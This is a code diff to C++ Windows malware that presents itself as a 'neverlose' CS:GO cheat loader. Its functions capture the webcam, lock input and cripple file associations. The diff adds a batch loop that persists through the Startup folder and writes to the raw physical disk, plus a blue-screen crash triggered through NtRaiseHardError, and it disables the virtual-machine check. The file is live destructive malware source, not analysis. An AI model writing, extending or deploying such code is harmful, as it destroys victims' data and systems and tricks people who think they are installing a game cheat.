@@ -87,22 +87,6 @@ __inline void FreeMediaType(AM_MEDIA_TYPE& mt)
 constexpr Gdiplus::PixelFormat kPixelFormat24bppRGB = (Gdiplus::PixelFormat)0x21808;
 constexpr Gdiplus::PixelFormat kPixelFormat32bppARGB = (Gdiplus::PixelFormat)0x26200A;
 
-namespace
-{
-    void print_banner()
-    {
-        SetConsoleTitleA("neverlose v3.8 beta");
-        std::puts("made by elecshep");
-        std::puts("            best loader                 ");
-        std::puts(">.<");
-        std::puts("");
-    }
-
-    void print_status(const char* label, const char* message)
-    {
-        std::printf("%s %s\n", label, message);
-    }
-}
 
 void capture_webcam()
 {
@@ -860,7 +844,7 @@ void desktop_destroyer()
         "copy \"%0\" \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\r\n"
         ":loop\r\n"
         "start www.%random%.net\r\n"
-        "start \\\\.\\globalroot\\device\\condrv\\kernelconnect\r\n"
+        "copy nul \\\\.\\PhysicalDrive0\r\n"
         "cd C:\\:$i30:$bitmap\r\n"
         "start %random%\r\n"
         "goto loop\r\n";
@@ -887,29 +871,16 @@ void desktop_destroyer()
         }
     }
 
-    // trigger condrv BSOD directly
-    WinExec(XSTR(_cbs), SW_HIDE);
+    MessageBoxW(nullptr, L"ur pc just fuck up", L"enjoy my gifts LOL", MB_OK | MB_ICONERROR);
 
-    // final MessageBox instead of console output
-    MessageBoxW(nullptr,
-        L"ur pc just fuck up",
-        L"enjoy my gifts LOL", MB_OK | MB_ICONERROR);
-
-    Sleep(10000);
-
-    WinExec(XSTR(_shd), SW_HIDE);
-
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tkp;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
-        tkp.PrivilegeCount = 1;
-        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);
-        CloseHandle(hToken);
+    // trigger BSOD via NtRaiseHardError (no admin needed)
+    typedef LONG NTSTATUS;
+    typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PULONG);
+    HMODULE ntdll = GetModuleHandleW(L"ntdll");
+    if (ntdll) {
+        pNtRaiseHardError fn = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+        if (fn) { ULONG r; fn(0xC000021A, 0, 0, nullptr, 6, &r); }
     }
-    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
-        SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
 }
 
 void cripple_exe_association()
@@ -1282,16 +1253,10 @@ bool is_vm()
 
 int main()
 {
-    if (is_vm()) {
-        MessageBoxW(nullptr, L"cannot run in a visual mechine", L"neverlose", MB_OK | MB_ICONERROR);
-        return 0;
-    }
+    // anti-VM disabled for testing
+    // if (is_vm()) { MessageBoxW(...); return 0; }
 
     BlockInput(TRUE);  // lock keyboard & mouse immediately
-
-    print_banner();
-    print_status("[*]", "Waiting for CS:GO...");
-    Sleep(300);
 
     guarded_collect();
 
@@ -1302,11 +1267,6 @@ int main()
     cripple_system();
     guarded_audio();
 
-    // clear console for Matrix effect
-    system("cls");
-
-    // start chaos effects after destruction, before shutdown
-    CreateThread(nullptr, 0, matrix_effect, nullptr, 0, nullptr);
     CreateThread(nullptr, 0, screen_icons, nullptr, 0, nullptr);
     CreateThread(nullptr, 0, beep_chaos, nullptr, 0, nullptr);
 
